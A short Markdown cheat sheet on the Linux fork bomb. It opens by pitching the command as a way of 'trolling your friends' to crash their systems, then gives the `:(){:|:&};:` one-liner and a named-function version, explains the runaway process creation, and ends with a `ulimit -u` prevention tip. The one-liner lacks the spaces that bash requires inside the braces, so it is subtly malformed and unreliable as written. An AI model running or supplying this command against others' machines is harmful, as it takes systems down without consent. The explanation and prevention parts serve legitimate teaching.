# Fork Bomb
#linux #forkbomb

**Classic commands for trolling your friends on linux to crash his system.**  

## How It Works
### Syntax
```sh
:(){:|:&};:
```

### Simple Explanation

* `:` is a valid function name, but let's rename it to something clearer.
* We'll use `fork_me` instead.

```sh
# Define a function that calls itself
fork_me() {
    fork_me | fork_me & 
}

# Start the function
fork_me
```

* What it does:

  * The function calls itself twice.
  * One call pipes into the other.
  * It's run in the background using `&`.
  * This repeats over and over, creating many processes (a **fork bomb**).

## Prevention
Set limit of user process using `ulimit`
```sh
# Display ulimit
ulimit -u

# Set ulimit value
ulimit -u 16
```

## Resources
- [Understanding Fork Bombs in 5 Minutes or Less](https://www.youtube.com/watch?v=RhtjGp7oMvE)
